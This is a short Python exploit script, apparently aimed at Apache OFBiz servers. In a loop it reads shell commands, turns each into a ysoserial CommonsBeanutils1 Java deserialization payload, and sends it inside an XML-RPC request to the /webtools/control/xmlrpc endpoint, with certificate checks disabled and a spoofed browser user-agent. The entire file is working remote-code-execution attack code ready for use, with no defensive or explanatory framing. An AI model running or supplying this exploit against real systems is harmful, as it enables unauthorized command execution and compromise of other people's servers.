import os
import requests
import click
import urllib3
urllib3.disable_warnings()

@click.command()
@click.option('--target', prompt="target", help='target url')
def main(target):
    if(not os.path.exists("ysoserial.jar")):
        exit("needed ysoserial.jar")
    while(True):
        cmd = input("cmd> ")
        url = target
        cmd = 'java -jar ysoserial.jar CommonsBeanutils1 "%s" | base64 | tr -d "\n"' %cmd
        r = os.popen(cmd)   
        payload = r.read()
        r.close()
        # print("Payload: ",payload)
        data = '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">' + payload + '</serializable></value></member></struct></value></param></params></methodCall>'
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        #print("Data: ",data)
        try:
            print("[!] Send payload ...")
            (requests.post(url+"/webtools/control/xmlrpc",data=data,verify=False,headers=headers,timeout=5).text)
            print("[+] Done!")
        except:
            pass
            print("[-] Error!")
        


if __name__ == "__main__":
    main()
